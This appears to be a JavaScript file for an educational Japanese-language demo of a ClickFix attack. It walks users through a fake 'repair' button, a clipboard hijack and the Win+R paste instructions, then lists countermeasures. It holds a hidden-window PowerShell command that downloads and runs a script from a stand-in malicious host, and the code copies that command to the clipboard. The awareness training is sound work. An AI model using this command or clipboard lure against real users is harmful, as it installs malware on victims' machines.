// clickfix.js - ClickFix攻撃シミュレーション

window.addEventListener("DOMContentLoaded", () => {
  const logArea = document.getElementById("clickfixLog");
  let attackStep = 0;
  let clickfixTutorialStep = 1;

  // 攻撃ペイロード（例：PowerShell経由でマルウェアをダウンロードして実行）
  const payload = `powershell -windowstyle hidden -c "iwr http://malicious-site.example.com/backdoor.ps1 -useb | iex"`;

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  function showAttackStep(step, title, content, type = 'info') {
    const timestamp = new Date().toLocaleTimeString('ja-JP');
    const icons = {
      info: '📋',
      warning: '⚠️',
      danger: '🚨',
      success: '✅'
    };
    const icon = icons[type] || icons.info;

    logArea.innerHTML += `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">${icon} ステップ${step}: ${title}</span>
          <span class="timestamp">${timestamp}</span>
        </div>
        <div class="content-info">
          <div class="preview">${content}</div>
        </div>
      </div>
    `;
    
    // 自動スクロール
    logArea.scrollTop = logArea.scrollHeight;
  }

  // ステップ1確認ボタンの処理
  window.confirmClickFixStep1 = function() {
    // ステップ1完了、ステップ2へ進む
    updateClickFixTutorialStep(2);
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#clickfix-step1 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
  };

  // ステップ3確認ボタンの処理
  window.confirmClickFixStep3 = function() {
    // ステップ3完了、ステップ4へ進む
    updateClickFixTutorialStep(4);
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#clickfix-step3 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
  };

  // メイン攻撃シミュレーション
  window.simulateClickFix = function () {
    attackStep++;
    
    // チュートリアル進行
    if (clickfixTutorialStep === 2) {
      updateClickFixTutorialStep(3);
    }
    
    if (attackStep === 1) {
      showAttackStep(1, "ユーザーが「修復」ボタンをクリック", 
        "ユーザーは一見無害な修復ボタンをクリックしました。<br>この時点で攻撃が開始されます。", 'warning');
        
      setTimeout(() => {
        simulateClipboardCopy();
      }, 1500);
    }
  };

  function simulateClipboardCopy() {
    navigator.clipboard.writeText(payload).then(() => {
      attackStep++;
      showAttackStep(2, "悪意あるコマンドをクリップボードにコピー",
        `以下の危険なコマンドがクリップボードにコピーされました：<br>
         <code style="background: #ffebee; color: #c62828; padding: 0.5rem; border-radius: 4px; display: block; margin: 0.5rem 0; word-break: break-all;">
         ${escapeHtml(payload)}
         </code>
         <strong>⚠️ このコマンドの危険性：</strong><br>
         • 外部サイトから悪意あるスクリプトをダウンロード<br>
         • バックドアやマルウェアの実行<br>
         • システム全体の乗っ取り`, 'danger');
      
      setTimeout(() => {
        showInstructionStep();
      }, 2000);
    }).catch(err => {
      showAttackStep(2, "クリップボードコピー失敗",
        `❌ コピーに失敗しました。ブラウザーの制限またはユーザー操作が必要です。<br>
         実際の攻撃では、この段階で成功することが多いです。`, 'warning');
      console.error("Clipboard write failed:", err);
    });
  }

  function showInstructionStep() {
    attackStep++;
    showAttackStep(3, "ユーザーへの実行指示",
      `攻撃者は次のような指示をユーザーに与えます：<br>
       <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 1rem; margin: 0.5rem 0; border-radius: 4px;">
         <strong>「修復を完了するため、以下の手順を実行してください：」</strong><br>
         1. Windowsキー + R を押してください<br>
         2. 表示されたダイアログで Ctrl + V を押してください<br>
         3. Enter キーを押して修復を完了してください
       </div>
       <strong>⚠️ 実際の被害：</strong>この手順を実行すると悪意あるコマンドが実行されます！`, 'danger');

    setTimeout(() => {
      showEducationalMessage();
    }, 3000);
  }

  function showEducationalMessage() {
    attackStep++;
    showAttackStep(4, "攻撃の完了と教育的解説",
      `<div style="background: #e8f5e9; border: 1px solid #4caf50; padding: 1rem; margin: 0.5rem 0; border-radius: 4px;">
         <strong>🎓 ここで学習ポイント：</strong><br>
         • 一見正当な「修復」ボタンが攻撃の入り口<br>
         • クリップボードに危険なコマンドが仕込まれる<br>
         • ユーザーが手動で実行することで攻撃完了<br>
         • 技術的知識がなくても簡単に騙される<br><br>
         <strong>🛡️ 対策：</strong><br>
         • 突然のエラーメッセージは疑う<br>
         • PowerShellコマンドの実行前に内容を確認<br>
         • 公式サポートを通じて問題を解決する
       </div>`, 'success');
    
    // チュートリアル進行：ステップ3のOKボタンを表示
    if (clickfixTutorialStep === 3) {
      const step3Button = document.querySelector('#clickfix-step3 .step-ok-button');
      if (step3Button) {
        step3Button.style.display = 'inline-block';
      }
    }
  }

  // 「後で修復」ボタンの処理
  window.showCancelWarning = function() {
    showAttackStep(0, "キャンセルボタンの罠",
      `<div style="background: #fff0f0; border: 1px solid #ffcdd2; padding: 1rem; margin: 0.5rem 0; border-radius: 4px;">
         <strong>⚠️ 注意：</strong>一部のClickFix攻撃では、「キャンセル」や「後で」ボタンでも攻撃が実行される場合があります。<br>
         安全な対処法は、<strong>ページを閉じる</strong>ことです。
       </div>`, 'warning');
    
    // チュートリアル進行
    if (clickfixTutorialStep === 4) {
      // ステップ4でOKボタンを表示
      const okButton = document.querySelector('#clickfix-step4 .step-ok-button');
      if (okButton) {
        okButton.style.display = 'inline-block';
      }
    }
  };

  // リセット機能
  window.resetClickFixDemo = function() {
    attackStep = 0;
    logArea.innerHTML = '<div class="message info">📋 デモをリセットしました。「修復する」ボタンをクリックして攻撃の流れを体験してください。</div>';
  };

  // 初期化専用（リセットメッセージなし）
  function initializeClickFixDemo() {
    attackStep = 0;
    logArea.innerHTML = '<div class="message info">📋 「修復する」ボタンをクリックして攻撃の流れを体験してください。</div>';
  }

  // チュートリアル機能
  function updateClickFixTutorialStep(stepNumber) {
    document.querySelectorAll('#tab-clickfix .step').forEach((step, index) => {
      step.classList.remove('active');
      if (index < stepNumber - 1) {
        step.classList.add('completed');
      }
    });
    
    const currentStep = document.getElementById(`clickfix-step${stepNumber}`);
    if (currentStep) {
      currentStep.classList.add('active');
    }
    clickfixTutorialStep = stepNumber;
  }

  window.resetClickFixTutorial = function() {
    document.querySelectorAll('#tab-clickfix .step').forEach(step => {
      step.classList.remove('completed', 'active');
    });
    document.getElementById('clickfix-step1').classList.add('active');
    clickfixTutorialStep = 1;
    
    // 全てのOKボタンを適切な状態にリセット
    const step1Button = document.querySelector('#clickfix-step1 .step-ok-button');
    if (step1Button) {
      step1Button.style.display = 'inline-block'; // ステップ1のボタンは表示
    }
    
    const step3Button = document.querySelector('#clickfix-step3 .step-ok-button');
    if (step3Button) {
      step3Button.style.display = 'none'; // ステップ3のボタンは非表示
    }
    
    const step4Button = document.querySelector('#clickfix-step4 .step-ok-button');
    if (step4Button) {
      step4Button.style.display = 'none'; // ステップ4のボタンは非表示
    }
    
    // お祝いメッセージを非表示にする
    const celebrationDiv = document.getElementById('clickfixCelebrationMessage');
    if (celebrationDiv) {
      celebrationDiv.style.display = 'none';
    }
    
    // チュートリアルリセット時は初期化専用関数を使用
    initializeClickFixDemo();
  };

  window.confirmClickFixStep4 = function() {
    // ステップ4完了、チュートリアル終了
    document.getElementById('clickfix-step4').classList.add('completed');
    document.getElementById('clickfix-step4').classList.remove('active');
    
    // OKボタンを非表示にする
    const okButton = document.querySelector('#clickfix-step4 .step-ok-button');
    if (okButton) {
      okButton.style.display = 'none';
    }
    
    // 完了メッセージを専用領域に表示
    const celebrationDiv = document.getElementById('clickfixCelebrationMessage');
    celebrationDiv.innerHTML = `
      <div class="clipboard-result">
        <div class="action-info">
          <span class="action">🎉 ClickFix攻撃チュートリアル完了！</span>
          <span class="timestamp">${new Date().toLocaleTimeString('ja-JP')}</span>
        </div>
        <div class="content-info">
          <div class="preview" style="background: #e8f5e9; color: #2e7d32; border: 1px solid #4caf50;">
            <strong>🎓 完璧！ClickFix攻撃とその対策を完全にマスターしました！</strong><br>
            ✅ 攻撃の仕組みと視覚的トリックを理解<br>
            ✅ 段階的な攻撃手法と危険性を体験<br>
            ✅ キャンセルボタンの罠も認識<br>
            ✅ 包括的な対策方法も学習済み<br><br>
            <strong>🛡️ あなたは今、ClickFix攻撃から身を守る知識と技術を身に付けました。</strong><br>
            実際にこのような攻撃に遭遇した際は、学習した対策を思い出して適切に対処してください！
          </div>
        </div>
      </div>
    `;
    celebrationDiv.style.display = 'block';
  };

  // アコーディオン機能
  window.toggleClickFixAccordion = function() {
    const header = document.querySelector('#clickfixAccordionContent').previousElementSibling;
    const content = document.getElementById('clickfixAccordionContent');
    const icon = header.querySelector('.accordion-icon');
    
    header.classList.toggle('active');
    content.classList.toggle('open');
    
    if (content.classList.contains('open')) {
      icon.textContent = '▲';
    } else {
      icon.textContent = '▼';
    }
  };

  // 初期化
  initializeClickFixDemo();
  document.getElementById('clickfix-step1').classList.add('active');
  
  // ステップ1のボタンを初期表示
  const step1Button = document.querySelector('#clickfix-step1 .step-ok-button');
  if (step1Button) {
    step1Button.style.display = 'inline-block';
  }
});
